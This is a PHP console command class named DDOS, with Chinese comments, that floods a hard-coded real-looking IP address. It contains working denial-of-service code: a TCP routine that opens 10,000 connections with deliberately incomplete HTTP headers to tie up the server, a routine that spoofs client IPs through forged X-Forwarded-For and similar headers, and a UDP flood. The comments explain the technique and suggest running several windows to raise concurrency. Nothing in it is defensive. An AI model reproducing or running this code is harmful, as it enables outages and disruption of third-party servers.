<?php
namespace App\Command;

use Root\Lib\BaseCommand;
use Root\Response;

/**
 * @purpose 用户自定义命令
 * @author administrator
 * @time 2024-12-26 03:42:25
 */
class DDOS extends BaseCommand
{

    /** @var string $command 命令触发字段，请替换为你自己的命令，执行：php start.php your:command */
    public $command = 'ddos';
    
     /**
     * 配置参数
     * @return void
     */
    public function configure(){
        /** 必选参数 */
        $this->addArgument('argument','这个是参数argument的描述信息');
        /** 可传参数 */
        $this->addOption('option','这个是option参数的描述信息');
    }
    
    /**
     * 清在这里编写你的业务逻辑
     * @return void
     */
    public function handle()
    {

        $this->info("请在这里编写你的业务逻辑");

        # http://54.77.139.23/home
        //$this->request('54.77.139.23');
        $this->sendTcp('54.77.139.23');
    }

    /**
     * 发送tcp请求
     * 就算太多的正常请求，也会导致对面服务器崩溃，这里可以开多个窗口的办法实现并发
     * 发送不正常的请求，http的header不完整，会导致对面的服务器一直等待接收header数据，占用正常的连接
     * @param string $host
     * @param int $number
     * @return void
     */
    public function sendTcp(string $host, int $port = 80, string $path = '/', int $number = 10000)
    {
        $time1 = time();
        if ($this->is_ip($host)) {
            $fuck = 'tcp://' . $host;
        } else {
            $fuck = parse_url($host)['path'];
        }

        /** 提前构建http请求 */
        $request = "GET {$path} HTTP/1.1\r\n";
        $request .= "Host:$host\r\n";
        //正常的配置应该是\r\n\r\n表示请求结束，不完整的话，对方服务器会一直等待这个请求发送header报文
        $request .= "Connection:close\r\n";
        //$request .= "Connection:close\r\n\r\n";
        //$request .= "Connection:Keep-Alive\r\n";
        for ($i = 1; $i <= $number; $i++) {
            $socket = fsockopen($fuck, $port, $errno, $errstr);
            if (!$socket) {
                echo "连接失败：$errno-$errstr\r\n";
            } else {
                /** 发送http请求 */
                fwrite($socket, $request);
                /** 获取响应类容 */
//                $response = "";
//                while (!feof($socket)) {
//                    $response .= fgets($socket, 1024);
//                }
//                echo $response;
                /** 关闭连接 */
                fclose($socket);
                echo "本次执行完毕$i\r\n";
            }
        }
        $time2 = time();
        $time = $time2 - $time1;
        echo "\r\n本次执行{$number}次请求，共耗时{$time}s\r\n";

    }

    /**
     * 伪造ip
     * @param $ip
     * @param $port
     * @param $target
     * @return void
     */
    public function request($ip = '127.0.0.1', $port = 80, $target = '/', $number = 10)
    {
        /** 生成随机来路页面 */
        $refererPool = [];
        for ($i = 0; $i <= 1000; $i++) {
            $refererPool[] = 'http://www.' . $this->makeUrl(rand(3, 10)) . '.com';
        }

        /** 生成随机ip */
        $ipPoolHead = [
            '43.204.109.', '202.020.105.', '202.000.104.', '202.009.064.', '202.012.026.', '202.012.086.',
            '172.87.219.', '218.173.8.', '202.020.091.', '202.020.091.', '202.020.092.', '202.020.093.',
            '202.020.106.', '202.020.110.', '202.020.112.', '202.020.119.', '202.042.000.', '202.052.224.',
            '202.047.140.', '202.046.032.', '202.046.000.', '202.043.032.', '202.042.000.', '202.058.128.',
            '202.059.000.', '202.059.032.', '202.060.000.', '202.061.000.', '202.061.192.', '202.062.224.',
            '202.000.192.', '202.000.188.', '202.001.160.', '202.002.004.', '202.003.128.', '202.004.032.',
            '202.004.096.', '202.005.128.', '202.006.005.', '202.006.095.', '202.006.098.', '202.012.090.',
            '4.240.588.', '1.260.155.', '19.443.581.', '11.252.953.', '54.263.318.', '1.864.941.', '14.195.713.',
            '4.276.167.', '1.187.197.', '89.840.951.', '1.877.093.', '73.300.874.', '27.796.749.', '1.682.699.',
            '10.427.369.', '351.406.784.', '17.563.824.', '2.296.016.', '8.740.369.', '136.027.638.', '12.924.474.',
            '1.667.574.', '4.767.051.', '2.795.883.', '1.480.083.', '24.178.460.', '35.314.327.', '14.384.451.', '83.681.375.',
            '119.423.708.', '1.263.646.', '2.272.299.', '5.736.487.', '20.844.874.', '2.369.160.', '6.004.949.', '19.982.052.',
            '14.352.975.', '8.397.068.', '46.689.344.', '12.298.389.', '56.599.716.', '198.794.915.', '6.253.002.', '114.184.476.',
            '1.947.097.', '3.332.042.', '2.857.919.', '1.913.999.', '12.273.380.', '1.245.470.', '6.713.621.', '29.570.513.',
            '6.910.682.', '3.182.260.', '53.982.007.', '15.755.299.', '7.292.719.', '1.036.234.', '1.770.833.', '3.474.519.',
            '6.298.596.', '6.121.344.', '21.408.895.', '1.266.563.', '6.800.386.', '1.257.783.', '7.667.115.', '2.391.012.',
            '45.580.863.', '10.808.959.', '1.889.454.', '29.997.599.', '18.606.540.', '2.650.046.', '1.694.855.', '28.894.918.',
            '16.272.539.', '6.938.424.', '2.459.200.', '245.065.297.', '1.449.117.', '10.953.155.', '1.090.440.', '36.518.419.',
            '16.888.423.', '7.874.248.', '9.563.733.', '1.293.084.', '2,.829.500.',
        ];
        $ipPool = [];

        foreach ($ipPoolHead as $head) {
            for ($i = 100; $i <= 225; $i++) {
                $ipPool[] = $head . $i;
            }
        }
        $ipPoolCount = count($ipPool) - 1;
        $refererCount = count($refererPool) - 1;
        for ($i = 0; $i < $number; $i++) {
            $refererIp = $ipPool[rand(0, $ipPoolCount)];//伪造来路IP
            $referer = $refererPool[rand(0, $refererCount)]; //伪造来路页面
            try {
                $fp = fsockopen("tcp://".$ip, $port, $errno, $errstr, 0.1);
            } catch (\Exception $exception) {
                /** 直接重试 */
                $this->request($ip, $port, $target, $number);
            }
            $end = "\r\n";
            $out = "GET $target HTTP/1.1$end";
            $out .= "Host: $ip$end";
            $out .= "Referer: $referer$end";

            $out .= "authority: $ip$end";
            $out .= "method: GET$end";
            $out .= "path: $target$end";
            $out .= "scheme: https$end";

            $out .= "Sec-Ch-Ua-Mobile: ?0\r\n";
            $out .= "Sec-Ch-Ua-Platform: Windows\r\n";
            $out .= "Sec-Fetch-Dest: document\r\n";
            $out .= "Sec-Fetch-Mode: navigate\r\n";
            $out .= "Sec-Fetch-Site: same-origin\r\n";
            $out .= "Sec-Fetch-User: ?1\r\n";
            $out .= "Upgrade-Insecure-Requests: 1\r\n";
            $out .= "Client-IP: $refererIp\r\n";
            $out .= "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\r\n";
            $out .= "X-Forwarded-For: $refererIp\r\n";
            $out .= "Accept-Encoding: gzip, deflate\r\n";
            $out .= "Accept-Language: zh-CN,zh;q=0.9\r\n";
            $out .= "Cache-Control: max-age=0\r\n";
            $out .= "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36\r\n";
            $out .= "x-real-ip: $refererIp\r\n";
            $out .= "x-client-ip: $refererIp\r\n";
            $out .= "via: $refererIp\r\n";
            $out .= "Proxy_Add_X_Forwarded_For: $refererIp\r\n";
            $out .= "Connection: Close$end";
            $out .= "$end";
            fwrite($fp, $out);
            while(!feof($fp))
            {
                echo  fgets($fp, 1024);
            }
            fclose($fp);
            echo "第{$i}次完成\r\n";

        }

    }

    /**
     * 发送udp数据
     * @param $host
     * @param $port
     * @return void
     */
    public function sendUdp($host, $port, $number = 10000)
    {
        for ($i = 0; $i < $number; $i++) {
            $socket = fsockopen('udp://' . $host, $port, $errno, $errstr);
            if (!$socket) {
                echo "连接失败：$errno-$errstr\r\n";
            } else {
                $data = "fuck you !";
                fwrite($socket, $data);
//                $response='';
//                while (!feof($socket)) {
//                    $response .= fgets($socket, 1024);
//                }
//                echo $response;
                /** 关闭连接 */
                fclose($socket);

            }
            echo "发送数据完成{$i}\r\n";
        }

    }

    /**
     * 检测是否是ip
     * @param $ip
     * @return bool
     */
    public function is_ip($ip)
    {
        if (filter_var($ip, FILTER_VALIDATE_IP)) {
            return true;
        } else {
            return false;
        }
    }

    /**
     * 生成随机字符串
     * @param $length
     * @return string
     */
    public function makeUrl($length = 8)
    {

        // 密码字符集，可任意添加你需要的字符
        $chars = [
            'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n',
            'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', 'A', 'B',
            'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P',
            'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '0', '1', '2', '3',
            '4', '5', '6', '7', '8', '9', '~', '!', '@', '#', '$', '%', '^', '&', '*',
        ];
        $sum = count($chars) - 1;

        // 在 $chars 中随机取 $length 个数组元素键名

        $password = '';
        for ($i = 0; $i < $length; $i++) {
            // 将 $length 个数组元素连接成字符串
            $password .= $chars[rand(0, $sum)];
        }
        return $password;
    }
}